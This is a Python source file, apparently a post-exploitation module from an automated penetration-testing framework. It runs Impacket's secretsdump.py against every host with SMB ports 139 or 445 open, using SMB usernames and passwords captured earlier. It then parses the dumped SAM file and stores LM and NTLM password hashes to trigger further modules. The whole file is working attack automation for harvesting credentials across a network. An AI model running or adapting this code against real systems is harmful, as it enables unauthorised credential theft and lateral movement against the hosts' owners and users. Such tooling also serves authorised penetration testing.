from core.actionModule import actionModule
from core.keystore import KeyStore as kb
from core.utils import Utils


class post_impacketsecretsdump(actionModule):
    def __init__(self, config, display, lock):
        super(post_impacketsecretsdump, self).__init__(config, display, lock)
        self.title = "Dump passwords and hashes"
        self.shortName = "secretsDump"
        self.description = "execute [sectredsdump.py [user]:[password]@[target] on each target"

        self.requirements = ["secretsdump.py"]
        self.triggers = ["newSmbPassword"]
        self.types = ["passwords"]

        self.safeLevel = 5

    def getTargets(self):
        # we are interested in all hosts
        self.targets = kb.get('port/tcp/139', 'port/tcp/445')

    def process(self):
        # load any targets we are interested in
        self.getTargets()

        # loop over each target
        for t in self.targets:
            users = self.getUsers(t)
            self.display.verbose(self.shortName + " - Connecting to " + t)
            for user in users:
                # verify we have not tested this host before
                if not self.seentarget(t + str(user)):
                    # add the new IP to the already seen list
                    self.addseentarget(t + str(user))

                    passwords = kb.get(['creds/host/' + t + '/username/' + user + '/password'])
                    for password in passwords:
                        self.display.verbose(self.shortName + " - Connecting to " + t)

                        # make outfile
                        temp_file = self.config[
                                        "proofsDir"] + self.shortName + "_" + t + "_" + user + "_" + Utils.getRandStr(
                            10)

                        # run secretesdump.py
                        command = self.config["secretsdump.py"] + " -outputfile " + temp_file + " \"" + user + "\":\"" + password + \
                                  "\"@" + t
                        result = Utils.execWait(command, None)

                        if Utils.isReadable(temp_file + '.sam'): 
                            with open (temp_file + '.sam', "r") as myfile:
                                result=myfile.readlines()

                            for line in result:
                                m = line.split(':')
                                user = m[0].strip()
                                uid = m[1].strip()
                                lmhash = m[2].strip()
                                ntlmhash = m[3].strip()

                                kb.add("creds/host/" + t + "/username/" + user + "/lmhash/" + lmhash)
                                kb.add("creds/host/" + t + "/username/" + user + "/ntlmhash/" + ntlmhash)
                                kb.add("creds/host/" + t + "/username/" + user + "/fullhash/" + lmhash + ":" + ntlmhash)
                                self.fire("newNTLMHash")
        return
